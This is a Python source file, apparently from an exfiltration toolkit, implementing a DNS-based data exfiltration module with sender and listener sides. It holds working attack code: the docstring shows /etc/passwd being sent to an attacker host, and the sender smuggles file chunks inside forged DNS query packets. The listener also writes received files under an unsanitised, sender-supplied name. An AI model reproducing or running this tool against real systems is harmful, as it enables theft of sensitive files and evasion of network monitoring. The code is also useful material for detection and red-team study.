#!/usr/bin/env python3
"""
DNS-based data exfiltration.

Usage:
    from pyexfil.network.DNS.dns_exfil import DNSExfil

    # Sender side
    dns = DNSExfil(host="ns1.attacker.com", port=53)
    dns.send("/etc/passwd")

    # Receiver side (blocks)
    dns = DNSExfil(host="0.0.0.0", port=53)
    dns.listen(callback=lambda data, meta: print(meta['filename'], len(data)))
"""

import os
import sys
import zlib
import time
import socket
from typing import Callable

from pyexfil.includes.base import NetworkModule

READ_BINARY       = "rb"
WRITE_BINARY      = "wb"
INITIATION_STRING = b"INIT_445"
DELIMITER         = b"::"
NULL              = b"\x00"
DATA_TERMINATOR   = b"\xcc\xcc\xcc\xcc\xff\xff\xff\xff"
TERM_PACKET       = DATA_TERMINATOR + NULL + DATA_TERMINATOR


def _build_dns_query(host: str) -> bytes:
    """Build a minimal DNS A-query packet for host."""
    packet = b"\x04\x06"   # Transaction ID
    packet += b"\x01\x00"  # Flags: standard query
    packet += b"\x00\x01"  # Questions: 1
    packet += b"\x00\x00"  # Answers: 0
    packet += b"\x00\x00"  # Authority: 0
    packet += b"\x00\x00"  # Additional: 0
    for part in host.split("."):
        part_bytes = part.encode("ascii")
        packet += bytes([len(part_bytes)]) + part_bytes
    packet += b"\x00"      # null-terminate QNAME
    packet += b"\x00\x01"  # QTYPE  A
    packet += b"\x00\x01"  # QCLASS IN
    return packet


class DNSExfil(NetworkModule):
    """Data exfiltration over DNS queries."""

    MODULE_NAME = "DNS"
    PROTOCOL    = "dns/udp"

    def __init__(
        self,
        host: str,
        port: int = 53,
        packet_delay: float = 0.01,
        max_packet_size: int = 128,
        verbose: bool = False,
    ):
        super().__init__(
            host=host,
            port=port,
            enc_key="",
            packet_delay=packet_delay,
            max_packet_size=max_packet_size,
            verbose=verbose,
        )

    # ------------------------------------------------------------------
    # Send side
    # ------------------------------------------------------------------

    def _send_impl(self, data, **kwargs) -> bool:
        """
        data: path to the file to exfiltrate (str) or raw bytes.
        """
        if isinstance(data, (str, os.PathLike)):
            try:
                with open(data, READ_BINARY) as f:
                    raw = f.read()
                filename = os.path.basename(str(data)).encode("utf-8")
            except IOError as e:
                sys.stderr.write("[DNS] Cannot open file: %s\n" % e)
                return False
        else:
            raw = data
            filename = b"data.bin"

        checksum = zlib.crc32(raw)

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except socket.error as e:
            sys.stderr.write("[DNS] Socket error: %s\n" % e)
            return False

        addr = (self.host, self.port)

        # Init packet
        init_pkt = _build_dns_query(self.host)
        init_pkt += INITIATION_STRING + filename + DELIMITER + str(checksum).encode() + NULL
        s.sendto(init_pkt, addr)

        # Data packets
        chunks = [raw[i:i + self.max_packet_size]
                  for i in range(0, len(raw), self.max_packet_size)]
        for chunk in chunks:
            pkt = _build_dns_query(self.host) + chunk + DATA_TERMINATOR
            s.sendto(pkt, addr)
            time.sleep(self.packet_delay)

        # Termination packet
        s.sendto(_build_dns_query(self.host) + TERM_PACKET, addr)
        s.close()
        return True

    # ------------------------------------------------------------------
    # Listen side
    # ------------------------------------------------------------------

    def _listen_impl(self, callback: Callable, **kwargs) -> None:
        """
        Listen for incoming DNS exfil sessions.
        callback(data: bytes, meta: dict) is called per completed transfer.
        meta keys: filename, checksum_ok, sender_addr
        """
        save_dir = kwargs.get("save_dir", ".")

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.bind((self.host, self.port))
        except socket.error as e:
            sys.stderr.write("[DNS] Bind failed: %s\n" % e)
            return

        filename = b""
        expected_crc = None
        buf = b""
        sender_addr = None

        # Header pattern: 12 bytes DNS header + N bytes QNAME + 4 bytes QTYPE/QCLASS
        HDR_TYPE_CLASS = b"\x00\x00\x01\x00\x01"

        while not self._stop_event.is_set():
            try:
                s.settimeout(1.0)
                raw, addr = s.recvfrom(4096)
            except socket.timeout:
                continue
            except socket.error as e:
                sys.stderr.write("[DNS] Recv error: %s\n" % e)
                break

            if INITIATION_STRING in raw:
                idx   = raw.find(INITIATION_STRING) + len(INITIATION_STRING)
                delim = raw.find(DELIMITER, idx)
                filename     = raw[idx:delim]
                expected_crc = int(raw[delim + len(DELIMITER):-1])
                buf          = b""
                sender_addr  = addr
                continue

            if TERM_PACKET in raw:
                if buf and expected_crc is not None:
                    ok = zlib.crc32(buf) == expected_crc
                    meta = {
                        "filename":    filename.decode("utf-8", errors="replace"),
                        "checksum_ok": ok,
                        "sender_addr": sender_addr,
                    }
                    if save_dir:
                        out = os.path.join(save_dir, meta["filename"])
                        with open(out, WRITE_BINARY) as f:
                            f.write(buf)
                    callback(buf, meta)
                buf = b""
                expected_crc = None
                continue

            # Data packet — strip DNS header and DATA_TERMINATOR
            end_hdr = raw.find(HDR_TYPE_CLASS)
            if end_hdr != -1:
                payload_start = end_hdr + len(HDR_TYPE_CLASS)
                payload_end   = raw.find(DATA_TERMINATOR, payload_start)
                if payload_end != -1:
                    buf += raw[payload_start:payload_end]

        s.close()
